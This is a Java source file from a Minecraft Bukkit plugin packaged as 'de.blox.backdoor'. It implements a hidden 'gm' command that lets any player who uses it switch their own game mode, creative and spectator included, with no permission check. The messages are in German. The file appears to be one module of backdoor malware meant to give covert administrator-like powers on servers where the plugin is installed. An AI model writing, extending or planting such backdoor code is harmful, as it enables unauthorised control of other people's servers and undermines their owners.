package de.blox.backdoor.commands.implement;


import de.blox.backdoor.commands.AbstractCommand;
import de.blox.backdoor.core.Core;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;


public class GameModeCommand extends AbstractCommand {


    public GameModeCommand() {
        super("Gamemode Change", "gm", "gm");
    }

    @Override
    public void processCommand(Player player, String line, String[] args) {
        if (args.length == 1) {
            switch (args[0]) {
                case "0":
                    player.setGameMode(GameMode.SURVIVAL);
                    player.sendMessage(Core.getInstance().getPrefix() + "Sie haben sich in den Survival Modus gesetzt.");
                    break;
                case "1":
                    player.setGameMode(GameMode.CREATIVE);
                    player.sendMessage(Core.getInstance().getPrefix() + "Sie haben sich in den Creative Modus gesetzt.");
                    break;
                case "2":
                    player.setGameMode(GameMode.ADVENTURE);
                    player.sendMessage(Core.getInstance().getPrefix() + "Sie haben sich in den Adventure Modus gesetzt.");
                    break;
                case "3":
                    player.setGameMode(GameMode.SPECTATOR);
                    player.sendMessage(Core.getInstance().getPrefix() + "Sie haben sich in den Spectator Modus gesetzt.");
                    break;
                default:
                    player.sendMessage(Core.getInstance().getPrefix() + "Der eingegebene Spielmodus ist nicht verfügbar.");
                    break;
            }
        }
    }

    @Override
    public boolean mustRegistered() {
        return true;
    }

}
